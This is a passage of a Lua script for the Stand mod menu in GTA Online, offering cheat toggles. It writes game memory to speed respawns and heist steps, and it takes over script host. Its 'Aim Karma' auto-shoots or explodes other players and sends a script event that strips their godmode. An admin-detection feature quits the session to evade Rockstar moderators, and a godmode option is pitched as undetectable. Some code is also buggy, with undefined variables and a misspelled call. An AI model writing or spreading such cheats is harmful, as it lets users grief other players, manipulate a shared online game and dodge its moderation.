        util.yield()
        local currentpos = players.get_position(player_id)
        local vel = ENTITY.GET_ENTITY_VELOCITY(ped)
        if not util.is_session_transition_active() and players.exists(player_id)
        and ryze.get_interior_player_is_in(player_id) == 0 and ryze.get_spawn_state(player_id) ~= 0
        and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
        and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped)
        and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped) and not PED.IS_PED_USING_SCENARIO(ped)
        and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and not TASK.GET_IS_TASK_ACTIVE(ped, 2)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) <= 395.0
        and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped) > 5.0 and not ENTITY.IS_ENTITY_IN_AIR(ped) and entities.player_info_get_game_state(ped_ptr) == 0
        and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
        and vel.x == 0.0 and vel.y == 0.0 and vel.z == 0.0 then
            util.toast(players.get_name(player_id) .. " Is using noclip")
            break
        end
    end
end)

menu.toggle_loop(normalmod, "Spectating", {}, "Detects if someone is spectating you", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        for i, interior in ipairs(interior_stuff) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            if not util.is_session_transition_active() and ryze.get_spawn_state(player_id) ~= 0 and ryze.get_interior_player_is_in(player_id) == interior
            and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(player_id)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 20.0 then
                    util.toast(players.get_name(player_id) .. " Is watching you")
                    break
                end
            end
        end
    end
end)

menu.toggle_loop(normalmod, "Teleport", {}, "Detects if a player is teleporting", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        util.create_thread(function()
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            if not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                local oldpos = players.get_position(player_id)
                util.yield(500)
                local currentpos = players.get_position(player_id)
                for i, interior in ipairs(interior_stuff) do
                    if v3.distance(oldpos, currentpos) > 300.0 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
                    and ryze.get_interior_player_is_in(player_id) ~= 0 and ryze.get_spawn_state(player_id) == interior and PLAYER.IS_PLAYER_PLAYING(player_id) and player.exists(player_id) then
                        util.toast(players.get_name(player_id) .. " Has teleported")
                    end
                end
            end
        end)
    end
end)

menu.toggle_loop(detections, "Votekick", {}, "Detects if someone is about to get votekicked ot of the sessiona.  Known as 'smart kick' on Stand.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local kickowner = NETWORK.NETWORK_SESSION_GET_KICK_VOTE(player_id)
        local kicked = NETWORK.NETWORK_SESSION_KICK_PLAYER(player_id)
        if kicked then
            util.draw_debug_text(players.get_name(player_id) .. " The player" .. kicked .. "has been votekicked by:" .. kickowner)
            break
        end
    end
end)

menu.toggle_loop(detections, "Thunder join", {}, "Detects if someone is joining your session in a unusual way.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        if not util.is_session_transition_active() and ryze.get_spawn_state(player_id) == 0 and players.get_script_host() == player_id  then
            util.toast(players.get_name(player_id) .. " Sent a detection (Thunder Join) and now is modder")
        end
    end
end)

--------------------------------------------------------------------------------------------------------------------------------
--Self

menu.slider(selfc, "Local transparency", {"transparency"}, "It'll make you less visible locally.", 0, 100, 100, 20, function(value)
    if value > 80 then
        ENTITY.RESET_ENTITY_ALPHA(players.user_ped())
    else
        ENTITY.SET_ENTITY_ALPHA(players.user_ped(), value * 2.55, false)
    end
end)

menu.toggle(selfc, "Cold blooded", {}, "Removes your thermal signal.\nSome players can still se you though.", function(toggle)
    local player = players.user_ped()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player)
    if toggle then
        PED.SET_PED_HEATSCALE_OVERRIDE(ped, 0)
    else
        PED.SET_PED_HEATSCALE_OVERRIDE(ped, 1)
    end
end)

local maxHealth <const> = 328
menu.toggle_loop(selfc, ("Out of the dead radar"), {"undeadotr"}, "", function()
	if ENTITY.GET_ENTITY_MAX_HEALTH(ryze.pwayerp) ~= 0 then
		ENTITY.SET_ENTITY_MAX_HEALTH(ryze.pwayerp, 0)
	end
end, function ()
	ENTITY.SET_ENTITY_MAX_HEALTH(ryze.pwayerp, maxHealth)
end)

menu.toggle_loop(selfc, "No animation", {}, "Swap weapons faster.", function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 56) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 92) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
    if (TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 160) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 167) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 165)) and not TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 195) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)

menu.toggle_loop(selfc, "Thermal gun", {}, "All your weapons will have thermal vision by pressing E when using them.", function()
    local aiming = PLAYER.IS_PLAYER_FREE_AIMING(players.user())
    if GRAPHICS.GET_USINGSEETHROUGH() and not aiming then
        menu.trigger_command(ryze.thermal_command,"off")
        GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(1)
    elseif PAD.IS_CONTROL_JUST_PRESSED(38,38) then
        if menu.get_value(ryze.thermal_command) or not aiming then
            menu.trigger_command(ryze.thermal_command,"off")
            GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(1)
        else
            menu.trigger_command(ryze.thermal_command,"on")
            GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(50)
        end
    end
end)

menu.toggle_loop(selfc, "Fast respawn", {}, "It'll disable the loading screen when respawning.", function()
    local gwobaw = memory.script_global(2672524 + 1685 + 756)
    if PED.IS_PED_DEAD_OR_DYING(ryze.pwayerp) then
        GRAPHICS.ANIMPOSTFX_STOP_ALL()
        memory.write_int(gwobaw, memory.read_int(gwobaw) | 1 << 1)
    end
end, function()
    local gwobaw = memory.script_global(2672524 + 1685 + 756)
    memory.write_int(gwobaw, memory.read_int(gwobaw) & ~(1 << 1)) 
end)

local s_forcefield_range = 25
local s_forcefield = 0
local s_forcefield_names = {
    [0] = "Push",
    [1] = "Pull"
}

menu.toggle_loop(selfc, "Force field", {"sforcefield"}, "", function()
    if players.exists(players.user()) then
        local _entities = {}
        local player_pos = players.get_position(players.user())

        for _, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if v3.distance(player_pos, vehicle_pos) <= s_forcefield_range then
                table.insert(_entities, vehicle)
            end
        end
        for _, ped in pairs(entities.get_all_peds_as_handles()) do
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if (v3.distance(player_pos, ped_pos) <= s_forcefield_range) and not PED.IS_PED_A_PLAYER(ped) then
                table.insert(_entities, ped)
            end
        end
        for i, entity in pairs(_entities) do
            local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
            local entity_type = ENTITY.GET_ENTITY_TYPE(entity)

            if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and not (player_vehicle == entity) then
                local force = ENTITY.GET_ENTITY_COORDS(entity)
                v3.sub(force, player_pos)
                v3.normalise(force)

                if (s_forcefield == 1) then
                    v3.mul(force, -1)
                end
                if (entity_type == 1) then
                    PED.SET_PED_TO_RAGDOLL(entity, 500, 0, 0, false, false, false)
                end

                ENTITY.APPLY_FORCE_TO_ENTITY(
                    entity, 3, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true, false, false
                )
            end
        end
    end
end)

menu.toggle(selfc, "Silent footsteps", {}, "Disables the sound you make when running/walking. (Networked)", function(toggle)
    AUDIO.SET_PED_FOOTSTEPS_EVENTS_ENABLED(PLAYER.PLAYER_PED_ID(), not toggle)
end)

menu.toggle(selfc, "Friendly fire", {}, "Enables friendly fire.", function(toggle)
    PED.SET_CAN_ATTACK_FRIENDLY(players.user_ped(), toggle, false)
end)

--------------------------------------------------------------------------------------------------------------------------------
--Online

menu.toggle_loop(online, "Maximum lock on range", {}, "You can lock onto any vehicle at any distance.", function()
    PLAYER.SET_PLAYER_LOCKON_RANGE_OVERRIDE(players.user(), 99999999.0)
end)

menu.toggle_loop(online, "Hop on faster", {}, "You'll hop into a session faster.", function()
    local script_host = players.get_script_host()
    local player = players.user()
    if util.is_session_transition_active() and script_host ~= player and script_host ~= -1 then
        menu.trigger_commands("givesh" .. players.get_name(player))
    end
end)

menu.toggle_loop(online, "Adicto SH", {}, "You become a script host adict.", function()
    if players.get_script_host() ~= players.user() and ryze.get_spawn_state(players.user()) ~= 0 then
        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(players.user())..">Friendly>Give Script Host"))
    end
end)

menu.toggle(online, "Anti-Chat", {}, "Makes the text box icon not appear on top of your head when writing in chat", function()
	if on then
		menu.trigger_commands("hidetyping on")
	else
		menu.trigger_commands("hidetyping off")
	end
end)

menu.toggle_loop(online, "Accept the invite", {}, "Accepts automatically the joining screens", function() -- credits to jinx for letting me steal this
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(50)
    end
end)

joining = false
menu.toggle(online, "Player notification", {}, "An alert pops up when a player joins the session", function(on_toggle)
	if on_toggle then
		joining = true
	else
		joining = false
	end
end)

local aimkrma = menu.list(online, "Aim Karma", {}, "You can do something to the players that aim their gun towards you.")

menu.toggle_loop(aimkrma, "Shoot", {}, "It shoots the player that aims at you.", function()
    if ryze.playerIsTargetingEntity(PLAYER.PLAYER_PED_ID()) and karma[PLAYER.PLAYER_PED_ID()] then
        local pos = ENTITY.GET_ENTITY_COORDS(karma[PLAYER.PLAYER_PED_ID()].ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z +0.1, 100, true, 100416529, PLAYER.PLAYER_PED_ID(), true, false, 100.0)
        util.yield(loopdelayMS + (loopdelaySEC * 1000) + (loopdelayMIN * 1000 * 60))
    end
end)

menu.toggle_loop(aimkrma, "Explode", {}, "Anyone who aims their gun at you will explode.", function()
    if ryze.playerIsTargetingEntity(PLAYER.PLAYER_PED_ID()) and karma[PLAYER.PLAYER_PED_ID()] then
        ryze.explodePlayer(karma[PLAYER.PLAYER_PED_ID()].ped, true)
    end
end)

menu.toggle_loop(aimkrma, "Disable their godmode", {"JSgodAimKarma"}, "The player that aims at you will lose their godmode if they have one (and if they have a shitty menu).", function()
    if ryze.playerIsTargetingEntity(PLAYER.PLAYER_PED_ID()) and karma[PLAYER.PLAYER_PED_ID()] and players.is_godmode(karma[PLAYER.PLAYER_PED_ID()].player_id) then
        local karmaPid = karma[PLAYER.PLAYER_PED_ID()].player_id
        util.trigger_script_event(1 << karmaPid, {800157557, karmaPid, 869796886})
    end
end)

local maxps = menu.list(online, "Host tools", {}, "")

menu.slider(maxps, "Max players", {}, "Maximum players in the lobby \nOnly works when you are the host.", 1, 32, 32, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(0, value)
        util.toast("free slots",NETWORK.NETWORK_SESSION_GET_MATCHMAKING_GROUP_FREE(0))
    end
end)

menu.slider(maxps, "Maximum spectators", {}, "Maximum spectators\nOnly works when you are the host.", 0, 2, 2, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(4, value)
        util.toast("free slots",NETWORK.NETWORK_SESSION_GET_MATCHMAKING_GROUP_FREE(4))
    end
end)

local warnlists = false
recovery = menu.list(online, "Recovery", {}, "", function()
    if warnlists then
        warnlists = true
        return
    end
    menu.show_warning(recovery, CLICK_MENU, "I dont assure that your account will be safe after using this.", function()
        warnlists = true
        menu.trigger_command(recovery, "")
    end)
end)

menu.toggle_loop(recovery, "Plasma cutter cayo perico 'Test'", {}, "It'll reduce the time the plasma cutter takes.", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()), true)
    local interior = INTERIOR.GET_INTERIOR_AT_COORDS(pos.x, pos.y, pos.z)
    if interior == 281601 then
        local cutterProgress = memory.read_float(memory.script_local("fm_mission_controller_2020", 284959))
        if cutterProgress then
            if cutterProgress > 0 and cutterProgress < 99.999 then
                memory.write_float(memory.script_local("fm_mission_controller_2020", 284959), 99.999)
                util.toast("Saltando Animacion...")
            end
        end
    end
end)

menu.toggle_loop(recovery, "Club popularity", {}, "It'll set the popularity of your night club at 100 always.", function(toggle)
    if ryze.getNightclubDailyEarnings() < 10000 then
        menu.trigger_commands("clubpopularity 100")
    end
end)
--------------------------------------------------------------------------------------------------------------------------------
--Protecciones
menu.action(protects, "Remove things", {}, "It'll remove stuff sutck to you or really close to you.", function()
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
    else
        menu.trigger_commands("mpfemale")
    end
end)

menu.toggle_loop(protects, "Stop all sounds", {"stopsounds"}, "", function()
    for i = -1,100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
        AUDIO.STOP_PED_RINGTONE(i)
    end
end)

menu.toggle(protects, "Panic mode", {"panic"}, "This renderizes a anti-crash mode, getting out of the way any otre type of event in the game at all costs.", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("desyncall on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        menu.trigger_commands("desyncall off")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)

menu.toggle_loop(protects, "GTFO when R* admin", {}, "If this detects a R* admin, you get transfered to another session instantly", function(on)
    bailOnAdminJoin = on
end)

if bailOnAdminJoin then
    if players.is_marked_as_admin(player_id) then
        util.toast(players.get_name(player_id) .. " There's an admin, noping the fuck out")
        menu.trigger_commands("quickbail")
        return
    end
end

menu.toggle(protects, "Remove Bounty", {}, "Will remove bountys when detected.", function(on)
    local RemoveBountyPath = menu.ref_by_path("Online>Remove Bounty")
    if on then
        util.yield(500)
        menu.trigger_command(RemoveBountyPath)
    else
        return
    end
end)

local quitarf = menu.list(protects, "Metodos De Anti Freeze")

menu.action(quitarf, "Remove freeze V1", {}, "Tries to restart some natives to remove the freeze state from your character.", function()
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    MISC.OVERRIDE_FREEZE_FLAGS(p0)
    menu.trigger_commands("rcleararea")
end)

menu.action(quitarf, "Remove freeze V2 'Test'", {}, "Tries to restart some natives to remove the freeze state from your character \nWith this one you'll die tho.", function()
    local player = PLAYER.PLAYER_PED_ID()
    local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    ENTITY.SET_ENTITY_SHOULD_FREEZE_WAITING_ON_COLLISION(player, false)
    ENTITY.SET_ENTITY_COORDS(player, playerpos.x, playerpos.y, playerpos.z, 1, false)
    MISC.OVERRIDE_FREEZE_FLAGS(p0)
    menu.trigger_commands("rcleararea")
end)

bloqmodders = menu.list(protects, "Protections against modders", {}, "")

menu.toggle_loop(bloqmodders, "Block clones", {}, "Blocks the clones that try to spawn.", function()
    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
    if ENTITY.GET_ENTITY_MODEL(ped) == ENTITY.GET_ENTITY_MODEL(players.user_ped()) and not PED.IS_PED_A_PLAYER(ped) and not util.is_session_transition_active() then
        util.toast("Clone Detected. Deleting")
        entities.delete_by_handle(ped)
        util.yield(150)
        end
    end
end)

menu.toggle(bloqmodders, "Prevent crashes", {}, "Tries to block the crashes \nActive if you're about to be crashed.", function(on_toggle)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    local ped = PLAYER.GET_PLAYER_PED(players.user())
    if on_toggle then
        util.yield(300)
        ENTITY.SET_ENTITY_COORDS(ped, 25.030561, 7640.8735, 17.831139, 1, false)
        util.yield(600)
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("trafficpotato on")
        util.yield(2000)
        menu.trigger_commands("rclearworld")
    else        
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("anticrashcamera off")
        menu.trigger_commands("trafficpotato off")
        util.yield(800)
        ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, false)
        util.yield(500)
        menu.trigger_commands("rclearworld")
        util.yield(1000)
        menu.trigger_commands("rcleararea")
        util.toast("Crash prevented :b")
    end
end)

menu.toggle_loop(bloqmodders, "Block PTFX", {}, "", function()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end)

if menu.get_edition() == 3 then
    menu.toggle_loop(bloqmodders, "Anti Beast", {}, "Prevents the game from picking you to be the beast in the online challenge.", function()
        if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0 then
            local host
            repeat
                host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("am_hunt_the_beast", -1, 0)
                util.yield()
            until host ~= -1
            util.toast(players.get_name(host).." started Hunt The Beast. Killing script...")
            menu.trigger_command(menu.ref_by_path("Online>Session>Session Scripts>Hunt the Beast>Stop Script"))
        end
    end)
end

menu.toggle_loop(bloqmodders, "Anti Transaction error ", {}, "Blocks my own script in order for this to work LMFAO.", function()
    if util.spoof_script("am_destroy_veh", SCRIPT.TERMINATE_THIS_THREAD) then
        util.toast("Finishing script (Detected)")
    end

    if HUD.GET_WARNING_SCREEN_MESSAGE_HASH() == -991495373 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(100)
    end
end)

menu.toggle(bloqmodders, "Keep me safe", {"safeass"}, "Uses some part of the natives to keep yourself on a safe state.", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    ENTITY.CREATE_MODEL_HIDE(pos.x, pos.y, pos.z, 10000.0, 1269906701, true)
    util.yield(75)
    ENTITY.CREATE_MODEL_HIDE(pos.x, pos.y, pos.z, 10000.0, -950858008, true)
    util.yield(75)
end)

local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}

local anticage = menu.list(protects, "Anti-jail protection", {}, "")
local alpha = 160
menu.slider(anticage, "Cage alpha", {"cagealpha"}, "Cage transparency. If it is on 0 you wont see it", 0, #values, 3, 1, function(amount)
    alpha = values[amount]
end)

menu.toggle_loop(anticage, "Anti jail", {"anticage"}, "", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        if net_obj == 0 or memory.read_byte(net_obj + 0x49) == players.user() then
            continue
        end
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
        for i, data in ipairs(my_ents) do
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha > 0 then
                util.toast("Someone is trying to cage you.")
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)
                ENTITY.SET_ENTITY_ALPHA(obj_handle, alpha, false)
            end
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha == 0 then
                entities.delete_by_handle(obj_handle)
            end
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)

fmugger = menu.list(protects, "Objects/Peds", {}, "")

local anti_mugger = menu.list(protects, "Anti-Mugger")

menu.toggle_loop(anti_mugger, "Towards me", {}, "Blocks muggers that were supposed to mug you.", function() -- thx nowiry for improving my method :D
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if (memory.read_int(sender) ~= player and memory.read_int(target) == player 
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId))) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Blocked mugger from " .. players.get_name(memory.read_int(sender)))
            end
        end)
    end
end)

menu.toggle_loop(anti_mugger, "Someone else", {}, "Blocks muggers from trying to mug other players.", function()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if memory.read_int(target) ~= player and memory.read_int(sender) ~= player
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId)) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Block mugger sent by " .. players.get_name(memory.read_int(sender)) .. " to " .. players.get_name(memory.read_int(target)))
            end
        end)
    end
end)

menu.toggle_loop(fmugger, "Objects F/", {"ghostobjects"}, "Disables collisions with objects.", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        ENTITY.SET_ENTITY_ALPHA(obj_handle, 255, false)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
        for i, data in ipairs(my_ents) do
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)  
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)

menu.toggle_loop(fmugger, "Vehicles F/", {"ghostvehicles"}, "Disables collisions with vehicles.", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, veh_ptr in ipairs(entities.get_all_vehicles_as_pointers()) do
        local net_veh = memory.read_long(veh_ptr + 0xd0)
        local veh_handle = entities.pointer_to_handle(veh_ptr)
        ENTITY.SET_ENTITY_ALPHA(veh_handle, 255, false)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(veh_handle)
        for i, data in ipairs(my_ents) do
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(veh_handle, data, false)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, veh_handle, false)  
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(veh_handle)
    end
end)

local pool_limiter = menu.list(protects, "Limiter Pool", {}, "")
local ped_limit = 175
menu.slider(pool_limiter, "Limiter pool/Peds", {"pedlimit"}, "", 0, 256, 175, 1, function(amount)
    ped_limit = amount
end)

local veh_limit = 200
menu.slider(pool_limiter, "Limiter pool/Vehicles", {"vehlimit"}, "", 0, 300, 150, 1, function(amount)
    veh_limit = amount
end)

local obj_limit = 750
menu.slider(pool_limiter, "Limiter pool/Objects", {"objlimit"}, "", 0, 2300, 750, 1, function(amount)
    obj_limit = amount
end)

local projectile_limit = 25
menu.slider(pool_limiter, "Limiter pool/Projectiles", {"projlimit"}, "", 0, 50, 25, 1, function(amount)
    projectile_limit = amount
end)

menu.toggle_loop(pool_limiter, "Activate limiter pool", {}, "", function()
    local ped_count = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        util.yield()
        if ped ~= players.user_ped() then
            ped_count += 1
        end
        if ped_count >= ped_limit then
            for _, ped in pairs(entities.get_all_peds_as_handles()) do
                util.yield()
                entities.delete_by_handle(ped)
            end
            util.toast("Cleaning peds' bools...")
        end
    end
    local veh__count = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        util.yield()
        veh__count += 1
        if veh__count >= veh_limit then
            for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
                entities.delete_by_handle(veh)
            end
            util.toast("Cleaning vehicle's bools ...")
        end
    end
    local obj_count = 0
    for _, obj in pairs(entities.get_all_objects_as_handles()) do
        util.yield()
        obj_count += 1
        if obj_count >= obj_limit then
            for _, obj in pairs(entities.get_all_objects_as_handles()) do
                entities.delete_by_handle(obj)
            end
            util.toast("Cleaning object's bools...")
        end
    end
end)

--------------------------------------------------------------------------------------------------------------------------------
-- Coches

menu.toggle_loop(vehicles, "Aim at passengers", {}, "You can aim at passengers inside a vehicle.", function()
	local localPed = players.user_ped()
	if not PED.IS_PED_IN_ANY_VEHICLE(localPed, false) then
		return
	end
	local vehicle = PED.GET_VEHICLE_PED_IS_IN(localPed, false)
	for seat = -1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) - 1 do
		local ped = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, seat, false)
		if ENTITY.DOES_ENTITY_EXIST(ped) and ped ~= localPed and PED.IS_PED_A_PLAYER(ped) then
			local playerGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(ped)
			local myGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(localPed)
			PED.SET_RELATIONSHIP_BETWEEN_GROUPS(4, playerGroupHash, myGroupHash)
		end
	end
end)

menu.toggle_loop(vehicles, "Can block missiles", {}, "You can aim with missiles at someone that blocks them.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            VEHICLE.SET_VEHICLE_ALLOW_HOMING_MISSLE_LOCKON_SYNCED(veh, true)
        end
    end
end)

menu.toggle_loop(vehicles, "Silent godmode", {}, "Wont be detected by most menus", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), true, true, true, true, true, 0, 0, true)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(players.user(), false), false, false, false, false, false, 0, 0, false)
end)

menu.toggle_loop(vehicles, "Indicator lights", {}, "", function()
    if(PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false)) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)

        local left = PAD.IS_CONTROL_PRESSED(34, 34)
        local right = PAD.IS_CONTROL_PRESSED(35, 35)
        local rear = PAD.IS_CONTROL_PRESSED(130, 130)

        if left and not right and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
        elseif right and not left and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        elseif rear and not left and not right then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        else
